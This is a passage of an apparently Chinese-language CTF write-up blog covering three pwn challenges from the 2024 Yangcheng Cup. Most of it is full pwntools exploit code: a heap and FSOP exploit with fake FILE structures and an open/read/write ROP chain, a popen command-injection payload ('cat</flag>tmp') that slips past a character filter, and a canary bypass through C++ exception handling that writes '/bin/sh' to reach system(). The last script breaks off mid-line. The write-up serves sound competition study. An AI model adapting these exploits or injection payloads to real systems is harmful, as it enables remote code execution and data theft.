class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">500</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">500</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>,<span class="number">2</span>)</span><br><span class="line">free(<span class="number">3</span>,<span class="number">3</span>)</span><br><span class="line">free(<span class="number">1</span>,<span class="number">1</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">500</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x510</span>)</span><br><span class="line">show(<span class="number">2</span>,<span class="number">2</span>)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x21ace0</span></span><br><span class="line">lg(<span class="string">&quot;libc_base&quot;</span>),</span><br><span class="line">free(<span class="number">2</span>,<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">500</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x510</span>+p32(<span class="number">2</span>)+p32(<span class="number">0</span>)+p32(<span class="number">8888</span>)+p32(<span class="number">2</span>)) <span class="comment"># 4</span></span><br><span class="line">djsk(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">2</span>,<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">500</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">500</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>)</span><br><span class="line">free(<span class="number">2</span>,<span class="number">1</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">500</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">500</span>,<span class="string">b&#x27;a&#x27;</span>) <span class="comment"># 8</span></span><br><span class="line">show(<span class="number">2</span>,<span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Note:&#x27;</span>)</span><br><span class="line">heap_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))-<span class="number">0x1461</span></span><br><span class="line">lg(<span class="string">&quot;heap_base&quot;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">500</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">500</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>)</span><br><span class="line">free(<span class="number">3</span>,<span class="number">4</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">500</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">500</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">500</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">500</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">1</span>,<span class="number">4</span>,<span class="number">500</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">500</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">4</span>,<span class="number">4</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">500</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>)</span><br><span class="line">free(<span class="number">1</span>,<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">large = libc_base + <span class="number">0x21b110</span></span><br><span class="line">heap = heap_base + <span class="number">0x2930</span></span><br><span class="line">meau(<span class="number">4</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Please input the city name&#x27;</span>)</span><br><span class="line">p.sendline(citys[<span class="number">0</span>])</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Please input the city name&#x27;</span>)</span><br><span class="line">p.sendline(citys[<span class="number">0</span>])</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Which one do you want to change?&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;How far?&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">0x100</span>))</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Note:&#x27;</span>)</span><br><span class="line">target = libc_base+libc.symbols[<span class="string">&#x27;_IO_list_all&#x27;</span>]-<span class="number">0x20</span></span><br><span class="line"></span><br><span class="line">fake_io_read = flat(&#123;</span><br><span class="line">    <span class="number">0x0</span>: <span class="number">0x8000</span> | <span class="number">0x40</span> | <span class="number">0x1000</span>, <span class="comment">#_flags</span></span><br><span class="line">    <span class="number">0x20</span>: target, <span class="comment">#_IO_write_base</span></span><br><span class="line">    <span class="number">0x28</span>: target - <span class="number">0x100</span>, <span class="comment">#_IO_write_ptr</span></span><br><span class="line">    <span class="number">0x68</span>: target-<span class="number">0x100</span>, <span class="comment">#_chain</span></span><br><span class="line">    <span class="number">0x70</span>: <span class="number">0</span>, <span class="comment"># _fileno</span></span><br><span class="line">    <span class="number">0xc0</span>: <span class="number">0</span>, <span class="comment">#_modes</span></span><br><span class="line">    <span class="number">0xd8</span>: libc_base + libc.symbols[<span class="string">&#x27;_IO_file_jumps&#x27;</span>] - <span class="number">0x8</span>, <span class="comment">#_vtables</span></span><br><span class="line">&#125;, filler=<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)+p64(<span class="number">0x531</span>)+p64(large)*<span class="number">2</span>+p64(target-<span class="number">0x100</span>)+p64(libc_base+libc.symbols[<span class="string">&#x27;_IO_list_all&#x27;</span>]-<span class="number">0x20</span>)+fake_io_read[<span class="number">0x30</span>:]</span><br><span class="line">p.send(payload)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">500</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">500</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>)</span><br><span class="line">meau(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Wrong&#x27;</span>)</span><br><span class="line">fake_io_read = flat(&#123;</span><br><span class="line">    <span class="number">0x0</span>: <span class="number">0x8000</span> | <span class="number">0x40</span> | <span class="number">0x1000</span>, <span class="comment">#_flags</span></span><br><span class="line">    <span class="number">0x20</span>: heap_base + <span class="number">0x5000</span>, <span class="comment">#_IO_write_base</span></span><br><span class="line">    <span class="number">0x28</span>: heap_base + <span class="number">0x5000</span> + <span class="number">0x500</span>, <span class="comment">#_IO_write_ptr</span></span><br><span class="line">    <span class="number">0x68</span>: heap_base + <span class="number">0x5000</span>, <span class="comment">#_chain</span></span><br><span class="line">    <span class="number">0x70</span>: <span class="number">0</span>, <span class="comment"># _fileno</span></span><br><span class="line">    <span class="number">0xc0</span>: <span class="number">0</span>, <span class="comment">#_modes</span></span><br><span class="line">    <span class="number">0xd8</span>: libc_base + libc.symbols[<span class="string">&#x27;_IO_file_jumps&#x27;</span>] - <span class="number">0x8</span>, <span class="comment">#_vtables</span></span><br><span class="line">&#125;, filler=<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">p.send(fake_io_read)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;&quot;</span></span><br><span class="line">fake_io_write = flat(&#123;</span><br><span class="line">    <span class="number">0x00</span>: <span class="number">0x8000</span> | <span class="number">0x800</span> | <span class="number">0x1000</span>, <span class="comment">#_flags</span></span><br><span class="line">    <span class="number">0x20</span>: libc_base+libc.symbols[<span class="string">&quot;environ&quot;</span>], <span class="comment">#_IO_write_base</span></span><br><span class="line">    <span class="number">0x28</span>: libc_base+libc.symbols[<span class="string">&quot;environ&quot;</span>] + <span class="number">8</span>, <span class="comment">#_IO_write_ptr</span></span><br><span class="line">    <span class="number">0x68</span>: heap_base + <span class="number">0x5000</span> + <span class="number">0x100</span>, <span class="comment">#_chain</span></span><br><span class="line">    <span class="number">0x70</span>: <span class="number">1</span>, <span class="comment"># _fileno</span></span><br><span class="line">    <span class="number">0xc0</span>: <span class="number">0</span>, <span class="comment">#_modes</span></span><br><span class="line">    <span class="number">0xd8</span>: libc_base + libc.symbols[<span class="string">&#x27;_IO_file_jumps&#x27;</span>], <span class="comment">#_vtables</span></span><br><span class="line">&#125;, filler=<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload = fake_io_write.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">fake_io_read = flat(&#123;</span><br><span class="line">    <span class="number">0x00</span>: <span class="number">0x8000</span> | <span class="number">0x40</span> | <span class="number">0x1000</span>, <span class="comment">#_flags</span></span><br><span class="line">    <span class="number">0x20</span>: heap_base + <span class="number">0x5000</span> + <span class="number">0x200</span>, <span class="comment">#_IO_write_base</span></span><br><span class="line">    <span class="number">0x28</span>: heap_base + <span class="number">0x5000</span> + <span class="number">0x500</span>, <span class="comment">#_IO_write_ptr</span></span><br><span class="line">    <span class="number">0x68</span>: heap_base + <span class="number">0x5000</span> + <span class="number">0x200</span>, <span class="comment">#_chain</span></span><br><span class="line">    <span class="number">0x70</span>: <span class="number">0</span>, <span class="comment"># _fileno</span></span><br><span class="line">    <span class="number">0xc0</span>: <span class="number">0</span>, <span class="comment">#_modes</span></span><br><span class="line">    <span class="number">0xd8</span>: libc_base + libc.symbols[<span class="string">&#x27;_IO_file_jumps&#x27;</span>] - <span class="number">0x8</span>, <span class="comment">#_vtables</span></span><br><span class="line">&#125;, filler=<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += fake_io_read.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">stack = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">lg(<span class="string">&#x27;stack&#x27;</span>)</span><br><span class="line">target = stack - <span class="number">712</span> + <span class="number">8</span></span><br><span class="line">lg(<span class="string">&#x27;target&#x27;</span>)</span><br><span class="line"></span><br><span class="line">fake_io_read = flat(&#123;</span><br><span class="line">    <span class="number">0x00</span>: <span class="number">0x8000</span> | <span class="number">0x40</span> | <span class="number">0x1000</span>, <span class="comment">#_flags</span></span><br><span class="line">    <span class="number">0x20</span>: target, <span class="comment">#_IO_write_base</span></span><br><span class="line">    <span class="number">0x28</span>: target + <span class="number">0x200</span>, <span class="comment">#_IO_write_ptr</span></span><br><span class="line">    <span class="number">0x68</span>: <span class="number">0</span>, <span class="comment">#_chain</span></span><br><span class="line">    <span class="number">0x70</span>: <span class="number">0</span>, <span class="comment"># _fileno</span></span><br><span class="line">    <span class="number">0xc0</span>: <span class="number">0</span>, <span class="comment">#_modes</span></span><br><span class="line">    <span class="number">0xd8</span>: libc_base + libc.symbols[<span class="string">&#x27;_IO_file_jumps&#x27;</span>] - <span class="number">0x8</span>, <span class="comment">#_vtables</span></span><br><span class="line">&#125;, filler=<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.send(fake_io_read)</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = libc_base + <span class="number">0x000000000002a3e5</span></span><br><span class="line">pop_rsi_ret = libc_base + <span class="number">0x000000000016333a</span></span><br><span class="line">pop_rdx_rbx_ret = libc_base + <span class="number">0x00000000000904a9</span></span><br><span class="line">pop_rax_ret = libc_base + <span class="number">0x0000000000045eb0</span></span><br><span class="line">syscall_ret = libc_base + <span class="number">0x0000000000091316</span></span><br><span class="line"></span><br><span class="line">payload = flat([</span><br><span class="line">    pop_rax_ret, <span class="number">2</span>,</span><br><span class="line">    pop_rax_ret, <span class="number">2</span>,</span><br><span class="line">    pop_rdi_ret, target + <span class="number">0xc0</span>,</span><br><span class="line">    pop_rsi_ret, <span class="number">0</span>,</span><br><span class="line">    syscall_ret,</span><br><span class="line"></span><br><span class="line">    pop_rax_ret, <span class="number">0</span>,</span><br><span class="line">    pop_rdi_ret, <span class="number">3</span>,</span><br><span class="line">    pop_rsi_ret, target + <span class="number">0x150</span>,</span><br><span class="line">    pop_rdx_rbx_ret, <span class="number">0x30</span>,<span class="number">0</span>,</span><br><span class="line">    syscall_ret,</span><br><span class="line"></span><br><span class="line">    pop_rax_ret, <span class="number">1</span>,</span><br><span class="line">    pop_rdi_ret, <span class="number">1</span>,</span><br><span class="line">    syscall_ret,</span><br><span class="line">    <span class="string">b&quot;flag\x00\x00\x00\x00&quot;</span></span><br><span class="line">])</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="httpd"><a href="#httpd" class="headerlink" title="httpd"></a>httpd</h3><p>这题实现了一个http服务器，其功能是对get请求的路径进行访问，如果路径以及文件合法就会打印出文件的内容</p><img src="/2024/08/28/%E7%BE%8A%E5%9F%8E%E6%9D%AF%202024%20pwn%20writeup/5.png" class="" title="我的图图呢">  <p>如上图所示，程序对我们输入的路径进行了十分严格的过滤，我们无法直接获取<code>/flag</code>的内容，因为会给过滤掉，可是我注意到了下面有个<code>popen</code>函数<br>函数的定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line">FILE * <span class="title function_">popen</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *command , <span class="type">const</span> <span class="type">char</span> *type )</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">pclose</span><span class="params">(FILE *stream)</span>;</span><br></pre></td></tr></table></figure><p>函数说明：</p><blockquote><p>popen()函数通过创建一个管道，调用fork()产生一个子进程，执行一个shell以运行命令来开启一个进程。这个管道必须由pclose()函数关闭，而不是fclose()函数。pclose()函数关闭标准I&#x2F;O流，等待命令执行结束，然后返回shell的终止状态。如果shell不能被执行，则pclose()返回的终止状态与shell已执行exit一样。<br>type参数只能是读或者写中的一种，得到的返回值（标准I&#x2F;O流）也具有和type相应的只读或只写类型。如果type是”r”则文件指针连接到command的标准输出；如果type是”w”则文件指针连接到command的标准输入。<br>command参数是一个指向以NULL结束的shell命令字符串的指针。这行命令将被传到bin&#x2F;sh并使用-c标志，shell将执行这个命令。<br>popen()的返回值是个标准I&#x2F;O流，必须由pclose来终止。前面提到这个流是单向的（只能用于读或写）。向这个流写内容相当于写入该命令的标准输入，命令的标准输出和调用popen()的进程相同；与之相反的，从流中读数据相当于读取命令的标准输出，命令的标准输入和调用popen()的进程相同。</p></blockquote><p>函数作用：</p><blockquote><p>popen函数允许一个程序将另外一个程序作为新进程来启动，并可以传递数据或者通过它接受数据。<br>其内部实现为调用 fork 产生一个子进程，执行一个 shell， 以运行命令来开启一个进程，这个进程必须由 pclose() 函数关闭。</p></blockquote><p>这么说<code>popen</code>函数就类似于<code>system</code>函数可以让我们进行任意命令执行，可是程序对我们输入的路径还进行了第二层过滤</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">_BOOL4 __cdecl <span class="title function_">sub_1F74</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  _BOOL4 result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> needle[<span class="number">3</span>]; <span class="comment">// [esp+15h] [ebp-13h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v3[<span class="number">4</span>]; <span class="comment">// [esp+18h] [ebp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v4; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">strcpy</span>(needle, <span class="string">&quot;sh&quot;</span>);</span><br><span class="line">  <span class="built_in">strcpy</span>(v3, <span class="string">&quot;bin&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strchr</span>(a1, <span class="number">38</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( <span class="built_in">strchr</span>(a1, <span class="number">124</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( <span class="built_in">strchr</span>(a1, <span class="number">59</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( <span class="built_in">strchr</span>(a1, <span class="number">36</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( <span class="built_in">strchr</span>(a1, <span class="number">123</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( <span class="built_in">strchr</span>(a1, <span class="number">125</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( <span class="built_in">strchr</span>(a1, <span class="number">96</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( <span class="built_in">strstr</span>(a1, needle) )</span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="built_in">strstr</span>(a1, v3) == <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v4 != __readgsdword(<span class="number">0x14</span>u) )</span><br><span class="line">    sub_2A70();</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到我们不能直接使用<code>/bin/sh</code>来起shell了，而且我们也不能直接<code>cat flag</code>，因为这中间有空格，会导致程序判断我们的get请求格式错误，所以我们可以先将&#x2F;flag的内容保存到当前目录下的tmp文件中，然后再读取该tmp文件来获取flag<br>转移flag：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">path = <span class="string">&#x27;cat&lt;/flag&gt;tmp&#x27;</span></span><br><span class="line">payload = <span class="string">&#x27;&#x27;&#x27;get /&#123;&#125; HTTP/1.0\r&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(path).encode()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">payload = <span class="string">b&#x27;Host: 256.256.256.256\r&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">payload = <span class="string">b&#x27;Content-Length: 1\r&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br></pre></td></tr></table></figure><p>读取flag：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">path = <span class="string">&#x27;./tmp&#x27;</span></span><br><span class="line">payload = <span class="string">&#x27;&#x27;&#x27;get /&#123;&#125; HTTP/1.0\r&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(path).encode()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">payload = <span class="string">b&#x27;Host: 256.256.256.256\r&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">payload = <span class="string">b&#x27;Content-Length: 1\r&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br></pre></td></tr></table></figure><h3 id="logger"><a href="#logger" class="headerlink" title="logger"></a>logger</h3><p>这道题目打的是<code>C++</code>中的异常处理，存在一个很明显的栈溢出，可是开启了<code>canary</code>，需要用异常处理来绕过</p><img src="/2024/08/28/%E7%BE%8A%E5%9F%8E%E6%9D%AF%202024%20pwn%20writeup/6.png" class="" title="我的图图呢">  <p>这里我一开始想的是打 <code>CHOP</code>，可是附件里并没有给各种依赖，然后我发现了下面这个东东</p><img src="/2024/08/28/%E7%BE%8A%E5%9F%8E%E6%9D%AF%202024%20pwn%20writeup/7.png" class="" title="我的图图呢">  <p>好家伙，这不是直接送我个<code>system</code>函数吗。经过调试，这个地方执行时<code>rdi</code>的值一直为<code>0x4040A0</code></p><img src="/2024/08/28/%E7%BE%8A%E5%9F%8E%E6%9D%AF%202024%20pwn%20writeup/8.png" class="" title="我的图图呢">  <p>这个地方存储了一个用来报错的字符串，我们注意到上面有一个数组，该程序存在一个该数组的越界写</p><img src="/2024/08/28/%E7%BE%8A%E5%9F%8E%E6%9D%AF%202024%20pwn%20writeup/9.png" class="" title="我的图图呢">  <p>当索引为8时我们就能在<code>0x4040A0</code>上写数据，我们可以直接写<code>/bin/sh</code>，然后利用<code>catch</code>中的<code>system</code>来直接getshell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process([&quot;./ld-linux-x86-64.so.2&quot;, &quot;./pwn&quot;],</span></span><br><span class="line">        <span class="comment"># env=&#123;&quot;LD_PRELOAD&quot;:&quot;./libc.so.6&quot;&#125;)</span></span><br><span class="line"><span class="comment"># p = process([&#x27;./libc.so&#x27;,&#x27;./pwn&#x27;])</span></span><br><span class="line"><span class="comment"># p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;139.155.126.78&#x27;</span>,<span class="number">34689</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment"># context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;wt.exe&#x27;</span>, <span class="string">&#x27;-w&#x27;</span>, <span class="string">&quot;0&quot;</span>, <span class="string">&quot;sp&quot;</span>, <span class="string">&quot;-d&quot;</span>, <span class="string">&quot;.&quot;</span>, <span class="string">&quot;wsl.exe&quot;</span>, <span class="string">&quot;-d&quot;</span>, <span class="string">&quot;Ubuntu-22.04&quot;</span>, <span class="string">&quot;bash&quot;</span>, <span class="string">&quot;-c&quot;</span>]</span><br><span class="line"><span class="comment"># context.terminal = [&#x27;wt.exe&#x27;, &#x27;-w&#x27;, &quot;0&quot;, &quot;sp&quot;, &quot;-d&quot;, &quot;.&quot;, &quot;wsl.exe&quot;, &quot;-d&quot;, &quot;Ubuntu-20.04&quot;, &quot;bash&quot;, &quot;-c&quot;]</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment"># ld = ELF(&#x27;./ld-2.31.so&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lg</span>(<span class="params">buf</span>):</span><br><span class="line">    <span class="keyword">global</span> heap_base</span><br><span class="line">    <span class="keyword">global</span> libc_base</span><br><span class="line">    <span class="keyword">global</span> target</span><br><span class="line">    <span class="keyword">global</span> temp</span><br><span class="line">    <span class="keyword">global</span> stack</span><br><span class="line">    <span class="keyword">global</span> leak</span><br><span class="line">    log.success(<span class="string">f&#x27;\033[33m<span class="subst">&#123;buf&#125;</span>:<span class="subst">&#123;<span class="built_in">eval</span>(buf):#x&#125;</span>\033[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">meau</span>(<span class="params">index</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Your chocie:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">rop = <span class="number">0x404200</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    meau(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;You can record log details here:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>*<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Do you need to check the records?&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">meau(<span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;[!] Type your message here plz:&#x27;</span>)</span><br><span class="line">payload = p64(rop+<span class="number">0x10</span>)*<span 